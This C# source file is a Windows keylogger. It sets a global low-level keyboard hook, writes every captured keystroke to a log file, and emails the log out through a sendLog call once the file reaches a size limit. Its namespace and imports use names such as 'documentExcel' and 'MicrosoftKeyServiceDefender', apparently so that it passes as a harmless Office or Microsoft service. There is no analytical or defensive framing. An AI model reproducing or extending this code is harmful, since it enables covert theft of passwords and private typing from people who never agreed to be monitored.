using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using static MicrosoftKeyServiceDefender.ServiceConstants;
using static MicrosoftKeyServiceDefender.KeyboardService;
using MicrosoftKeyServiceDefender;

namespace documentExcel
{
    class Program
    {
        private static IntPtr afterFirstHook = IntPtr.Zero;
        internal static LowLevelKeyboardProc keyboardProcedure = KeyboardHookService;
        private static string tempCharacters = "";

        static void Main(string[] args)
        {
            afterFirstHook = SetHook();
            Application.Run();
            UnhookWindowsHookEx(afterFirstHook);
        }

        private static IntPtr SetHook()
        {
            var executingProcess = Process.GetCurrentProcess();
            var mainModule = executingProcess.MainModule;
            var moduleHandle = GetModuleHandle(mainModule.ModuleName);
            return SetWindowsHookEx(LowLevelHookCode, keyboardProcedure, moduleHandle, 0);
        }

        private static IntPtr KeyboardHookService(int nCode, IntPtr wParam, IntPtr lParam)
        {
            var logFile = new FileInfo(LogFile);

            if (tempCharacters.Length >= 0)
            {
                var output = new StreamWriter(LogFile, true);

                output.Write(tempCharacters);
                output.Close();

                tempCharacters = "";
            }

            if (logFile.Exists && logFile.Length >= MaxLogLength)
            {
                try
                {
                    logFile.CopyTo(EmailLogFile, true);
                    logFile.Delete();

                    EmailServiceProvider.sendLog();
                }
                catch(Exception ex)
                {
                    Console.Out.WriteLine("Service Failed: " + ex.Message);
                }
            }

            tempCharacters = tempCharacters + FindKeyboardChar(nCode, wParam, lParam);
            
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }
    }
}
